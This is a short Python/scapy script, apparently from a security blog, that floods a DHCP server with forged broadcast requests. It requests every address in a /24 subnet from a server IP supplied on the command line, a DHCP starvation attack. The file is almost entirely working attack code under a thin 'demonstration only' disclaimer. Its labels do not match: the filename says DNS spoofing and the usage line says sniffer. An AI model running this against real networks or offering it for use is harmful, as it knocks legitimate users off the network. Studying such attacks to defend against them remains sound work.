#!/usr/bin/env python
# This code is strictly for demonstration purposes.
# If used in any other way or for any other purposes. In no way am I responsible
# for your actions or any damage which may occur as a result of its usage
# dnsSpoof.py
# Author: Nik Alleyne - nikalleyne at gmail dot com
# http://securitynik.blogspot.com

from sys import argv, exit
from scapy.all import *

def usage():
    print("[*]Usage: python sniffer.py [network interface] [DHCP IP to spoof]")
    
def killdhcpserver():
    print "Beginning to flood DHCP server"

    layer2_broadcast = "ff:ff:ff:ff:ff:ff"
    IP_address_subnet = "192.168.36."
    bogusMac = RandMAC()
    
    for ip in range (0,254):
        dhcp_discover = Ether(src=bogusMac,dst=layer2_broadcast) / \
        IP(src="0.0.0.0",dst="255.255.255.255") / \
        scapy.all.UDP(sport=68,dport=67) / \
        scapy.all.BOOTP(chaddr=bogusMac) / \
        scapy.all.DHCP(options=[("message-type","request"),("server_id",sys.argv[2]),("requested_addr", IP_address_subnet + str(ip)),"end"])
        sendp(dhcp_discover,iface = sys.argv[1])

if len(sys.argv) < 3:
    usage()
    exit(0)

if __name__ == '__main__':
    killdhcpserver()
